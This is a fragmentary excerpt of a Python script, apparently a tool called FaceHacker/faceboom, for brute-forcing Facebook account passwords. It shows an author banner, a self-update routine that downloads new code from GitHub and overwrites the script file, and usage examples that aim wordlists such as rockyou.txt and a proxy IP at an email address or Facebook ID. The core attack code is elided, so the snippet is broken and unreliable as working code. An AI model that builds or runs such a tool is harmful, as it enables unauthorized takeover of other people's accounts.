...
==================================
[---]         """+yl+"""Cyber King (Waqas Ahmad Zain)"""+gr+"""         [---]
==================================
[>] Target      :> """+wi+target+gr+"""
...
==================================\n"""+wi)
    ...
    def updateFaceHacker():
        ...
        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
                ...
                conn.request("GET", "/itxzani/FaceHacker/master/faceHacker.py")
                newCode = conn.getresponse().read().strip().decode()
                with open("faceHacker.py", "w") as  faceBoomScript:
...
Examples:
        |
     |--------
     | python faceboom.py -t unkniw@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python faceboom.py -t 1000010130767540 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python faceboom.py -t unkniw@gmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python faceboom.py -t unkniw@gmail.com
     | python faceboom.py -g https://www.facebook.com/unkniw@gmail.com
     |--------
""")
...
def Main():
   ...
   if update:
    ...
    sys.exit(1)
        ...
        faceHacker.banner(target,wordlist,single_passwd)
